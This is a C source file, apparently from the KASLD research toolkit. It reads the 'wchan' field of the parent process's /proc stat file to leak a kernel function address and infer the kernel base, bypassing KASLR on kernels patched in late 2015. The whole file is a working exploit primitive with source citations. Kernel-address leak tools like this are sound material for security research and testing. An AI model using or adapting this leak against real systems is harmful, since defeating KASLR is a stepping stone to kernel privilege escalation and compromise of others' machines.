// This file is part of KASLD - https://github.com/bcoles/kasld
// Leak the parent process waiting kernel function virtual address
// from /proc/<PPID>/stat wait channel 'wchan' field. Patched late 2015.
// - https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
// - https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf
// - https://marcograss.github.io/security/linux/2016/01/24/exploiting-infoleak-linux-kaslr-bypass.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

#define CHUNK_SIZE 1024

unsigned long get_kernel_addr_proc_stat_wchan() {
  FILE *f;
  char path[32];
  unsigned long addr = 0;
  char buff[CHUNK_SIZE];

  snprintf(path, sizeof(path), "/proc/%d/stat", (pid_t)getppid());

  printf("[.] checking %s 'wchan' field ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  if (fgets(buff, CHUNK_SIZE, f) == NULL) {
    printf("[-] fgets(%s): %m\n", path);
    return 0;
  }

  char delim[] = " ";

  char *ptr = strtok(buff, delim);
  while ((ptr = strtok(NULL, delim)) != NULL) {
    char* endptr = &ptr[strlen(ptr)];
    addr = (unsigned long)strtoull(&ptr[0], &endptr, 10);

    if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  fclose(f);

  return addr;
}

int main (int argc, char **argv) {
  struct utsname u = get_kernel_version();

  /* this technique should also work on 32-bit. lazy */
  if (strstr(u.machine, "64") == NULL) {
    printf("[-] unsupported: system is not 64-bit.\n");
    exit(1);
  }

  unsigned long addr = get_kernel_addr_proc_stat_wchan();
  if (!addr) return 1;

  printf("leaked wchan address: %lx\n", addr);

  if ((addr & 0xfffffffffff00000ul) == (addr & 0xffffffffff000000ul)) {
    printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);
  } else {
    printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
    printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
  }

  return 0;
}

